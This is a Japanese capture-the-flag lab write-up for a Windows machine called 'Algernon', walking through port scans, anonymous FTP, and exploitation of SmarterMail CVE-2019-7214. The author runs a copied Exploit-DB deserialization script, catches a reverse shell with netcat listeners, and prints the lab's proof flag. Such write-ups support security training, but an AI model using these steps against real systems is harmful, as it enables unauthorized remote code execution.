# Algernon

## Nmap

TCPポートスキャン．

```bash
$ ports=$(nmap -p- --min-rate=1000 -T4 192.168.140.65 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

$ nmap -p$ports -sV -A 192.168.140.65
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-01 21:35 JST
Nmap scan report for 192.168.140.65
Host is up (0.24s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
| http-methods:
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
9998/tcp  open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| uptime-agent-info: HTTP/1.1 400 Bad Request\x0D
| Content-Type: text/html; charset=us-ascii\x0D
| Server: Microsoft-HTTPAPI/2.0\x0D
| Date: Sun, 01 May 2022 12:36:19 GMT\x0D
| Connection: close\x0D
| Content-Length: 326\x0D
| \x0D
| <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">\x0D
| <HTML><HEAD><TITLE>Bad Request</TITLE>\x0D
| <META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>\x0D
| <BODY><h2>Bad Request - Invalid Verb</h2>\x0D
| <hr><p>HTTP Error 400. The request verb is invalid.</p>\x0D
|_</BODY></HTML>\x0D
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was /interface/root
17001/tcp open  remoting      MS .NET Remoting services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-05-01T12:36:23
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.34 seconds
```

UDPポートスキャン．

```bash
$ sudo nmap -Pn -sU --min-rate=10000 192.168.140.65
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-01 21:36 JST
Nmap scan report for 192.168.140.65
Host is up.
All 1000 scanned ports on 192.168.140.65 are in ignored states.
Not shown: 1000 open|filtered udp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 2.21 seconds
```

## FTP - 21TCP

anonymous ログインができる．

```bash
$ ftp 192.168.140.65 21
Connected to 192.168.140.65.
220 Microsoft FTP Service
Name (192.168.140.65:funa): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> 
```

とくに情報は無かった．

## HTTP - 80TCP

Internet Information Services (IIS) が表示される．

IIS というのは GUI で設定が可能な web サーバアプリケーション．

Apache, nginx のような機能が GUI で設定できると考えて良さそう．

![image-20220501214528892](/home/funa/.config/Typora/typora-user-images/image-20220501214528892.png)

## HTTP - 9998TCP

SmarterMail のログインページが表示される．

デフォルトである `admin:admin` ではログインできなかった．

![image-20220501214641491](/home/funa/.config/Typora/typora-user-images/image-20220501214641491.png)

SmarterMail の CVE を検索すると，`CVE-2019-7214` という `Score` 10.0 の脆弱性が見つかる．

![image-20220501222805938](/home/funa/.config/Typora/typora-user-images/image-20220501222805938.png)

> CVE-2019-7214
>
> SmarterTools SmarterMail 16.x before build 6985 allows deserialization of untrusted data. An unauthenticated attacker could run commands on the server when port 17001 was remotely accessible. This port is not accessible remotely by default after applying the Build 6985 patch.

Nmap の結果を見ると，`17001` ポートが開いているため，バージョンが `16.x` かは確認できないが試してみる価値はありそう．

[SmarterMail Build 6985 - RCE](https://www.exploit-db.com/exploits/49216) のエクスプロイトコードをコピーし，IP アドレスを自分の環境のものに書き換えて実行する．

```bash
$ python3 smartermail_deserialisation_attack.py
```

実行する際に `netcat` でリバースシェルを受け取る．

```bash
$ nc -lvp 6666
listening on [any] 6666 ...
```

シェルは返ってこなかった．

## 後日談

日を置いて試したところ，シェルが返ってきた．原因は不明．

```bash
$ python3 smartermail_deserialisation_attack.py
```

```bash
$ nc -lvp 443
listening on [any] 443 ...
192.168.159.65: inverse host lookup failed: Unknown host
connect to [192.168.49.159] from (UNKNOWN) [192.168.159.65] 49797
PS C:\Windows\system32>
<snip>
PS C:\Users\Administrator\Desktop> type proof.txt
4524ce30101cef174e8cc1f95fa3bc5b
```

Congratulations!